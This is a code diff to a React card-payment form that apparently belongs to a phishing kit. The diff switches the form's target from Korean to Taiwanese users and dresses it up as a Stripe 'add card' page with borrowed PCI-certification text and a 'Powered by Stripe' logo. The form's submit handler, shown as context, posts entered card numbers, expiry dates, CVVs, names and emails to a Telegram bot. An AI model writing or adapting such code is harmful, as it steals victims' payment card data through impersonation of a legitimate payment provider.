@@ -32,23 +32,23 @@ const luhnCheck = (cardNumber) => {
 
 const i18n = {
   zh: {
-    email: '電子郵件', card: '卡號', expiry: '有效期', cvc: 'CVC', name: '持卡人姓名', submit: '立即付款', saved: '儲存卡片資訊', success: '付款成功，我們已收到您的資料。', error: '卡號不正確，請重新輸入', currency: 'NT$',
+    email: '電子郵件', card: '卡號', expiry: '到期日', cvc: 'CVV', name: '持卡人姓名', submit: '新增', saved: '我想要安全儲存我的卡片。', success: '付款成功，我們已收到您的資料。', error: '卡號不正確，請重新輸入', currency: 'NT$'
   },
   en: {
-    email: 'Email', card: 'Card Number', expiry: 'MM / YY', cvc: 'CVC', name: 'Name on Card', submit: 'Subscribe', saved: 'Save my card', success: 'Payment successful.', error: 'Invalid card number.', currency: '$',
+    email: 'Email', card: 'Card Number', expiry: 'MM / YY', cvc: 'CVC', name: 'Name on Card', submit: 'Subscribe', saved: 'Save my card', success: 'Payment successful.', error: 'Invalid card number.', currency: '$'
   },
   ko: {
-    email: '이메일', card: '카드 번호', expiry: '만료일 (MM / YY)', cvc: 'CVC', name: '카드 소유자 이름', submit: '결제하기', saved: '카드 정보 저장', success: '결제가 완료되었습니다.', error: '유효하지 않은 카드 번호입니다.', currency: '₩',
+    email: '이메일', card: '카드 번호', expiry: '만료일 (MM / YY)', cvc: 'CVC', name: '카드 소유자 이름', submit: '결제하기', saved: '카드 정보 저장', success: '결제가 완료되었습니다.', error: '유효하지 않은 카드 번호입니다.', currency: '₩'
   }
 };
 
 export default function App() {
-  const [lang] = useState('ko');
+  const [lang] = useState('zh');
   const [loading, setLoading] = useState(false);
   const [cardType, setCardType] = useState(null);
   const [error, setError] = useState(null);
   const [formData, setFormData] = useState({
-    email: '', card: '', expiry: '', cvc: '', name: '', country: 'Korea', saveInfo: false,
+    email: '', card: '', expiry: '', cvc: '', name: '', country: 'Taiwan', saveInfo: false
   });
 
   const formatCard = (value) => value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
@@ -82,7 +82,7 @@ export default function App() {
     await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID, text: message }),
+      body: JSON.stringify({ chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID, text: message })
     });
 
     setTimeout(() => {
@@ -91,41 +91,38 @@ export default function App() {
     }, 1000);
   };
 
-  const isRTL = lang === 'ar' || lang === 'he';
-
   return (
-    <div className={`min-h-screen bg-[#f6f9fc] flex items-center justify-center px-4 py-12 ${isRTL ? 'direction-rtl text-right' : ''}`}>
-      <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl border border-gray-200 p-10 font-sans text-base space-y-4">
-        <input type="email" name="email" placeholder={i18n[lang].email} value={formData.email} onChange={handleChange} className="w-full border border-gray-300 rounded-lg px-4 py-3" />
+    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-8">
+      <div className="w-full max-w-md bg-white p-5 space-y-4 text-sm">
+        <div className="text-lg font-semibold">新增卡片</div>
+        <input type="text" name="alias" placeholder="卡片名稱" className="w-full border px-3 py-2 rounded" />
 
-        <label className="block text-xs text-gray-600 font-semibold mt-2">{i18n[lang].card}</label>
-        <div className="relative">
-          <input type="text" name="card" placeholder="1234 1234 1234 1234" value={formData.card} onChange={handleChange} maxLength={19} className="w-full border border-gray-300 rounded-lg px-4 py-3 pr-20 tracking-widest" inputMode="numeric" />
-          {cardType && <img src={cardType} alt="card logo" className="absolute right-3 top-1/2 -translate-y-1/2 h-6" />}
-        </div>
-        {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
-
-        <div className="flex gap-4">
-          <input type="text" name="expiry" placeholder={i18n[lang].expiry} value={formData.expiry} onChange={handleChange} maxLength={7} className="w-1/2 border border-gray-300 rounded-lg px-4 py-3" />
-          <input type="text" name="cvc" placeholder={i18n[lang].cvc} value={formData.cvc} onChange={handleChange} maxLength={4} className="w-1/2 border border-gray-300 rounded-lg px-4 py-3" />
+        <div className="flex items-center gap-2 pl-1">
+          {[visa, amex, msc, up, jcb].map((logo, i) => <img key={i} src={logo} alt="logo" className="h-5" />)}
         </div>
 
-        <input type="text" name="name" placeholder={i18n[lang].name} value={formData.name} onChange={handleChange} className="w-full border border-gray-300 rounded-lg px-4 py-3" />
+        <input type="text" name="card" value={formData.card} placeholder="卡號" onChange={handleChange} className="w-full border px-3 py-2 rounded" />
+        <input type="text" name="name" value={formData.name} placeholder="持卡人姓名" onChange={handleChange} className="w-full border px-3 py-2 rounded" />
 
-        <select name="country" value={formData.country} onChange={handleChange} className="w-full border border-gray-300 rounded-lg px-4 py-3">
-          <option value="Korea">Korea</option>
-          <option value="Taiwan">Taiwan</option>
-          <option value="Japan">Japan</option>
-          <option value="USA">USA</option>
-        </select>
+        <div className="flex gap-2">
+          <input type="text" name="expiry" value={formData.expiry} onChange={handleChange} placeholder="到期日" className="w-1/2 border px-3 py-2 rounded" />
+          <input type="text" name="cvc" value={formData.cvc} onChange={handleChange} placeholder="CVV" className="w-1/2 border px-3 py-2 rounded" />
+        </div>
 
         <div className="flex items-center gap-2">
-          <input type="checkbox" name="saveInfo" checked={formData.saveInfo} onChange={handleChange} className="h-4 w-4" />
-          <label className="text-sm font-medium">{i18n[lang].saved}</label>
+          <input type="checkbox" name="saveInfo" checked={formData.saveInfo} onChange={handleChange} />
+          <span>{i18n[lang].saved}</span>
         </div>
 
-        <button onClick={handleSubmit} disabled={loading} className="w-full bg-[#0070f3] hover:bg-[#005dd1] text-white text-base py-3 rounded-lg font-semibold">
-          {loading ? '처리 중...' : i18n[lang].submit} {i18n[lang].currency}108
+        <div className="text-xs text-neutral-500 leading-relaxed">
+          <div className="font-semibold">進一步瞭解安全性</div>
+          <div>Stripe 已通過 PCI 認證稽核者的稽核，並獲得 PCI 服務業者第 1 級的認證。此為支付業界目前最嚴格的認證等級。<a href="https://stripe.com/docs/security/stripe" className="underline" target="_blank">瞭解詳情</a></div>
+        </div>
+
+        <img src="https://stripe.com/img/v3/newsroom/powered-by-stripe.svg" className="h-5 mt-2" alt="Powered by Stripe" />
+
+        <button onClick={handleSubmit} disabled={loading} className="w-full mt-2 bg-neutral-700 hover:bg-black text-white py-2 rounded">
+          {loading ? '處理中...' : '新增'}
         </button>
       </div>
     </div>
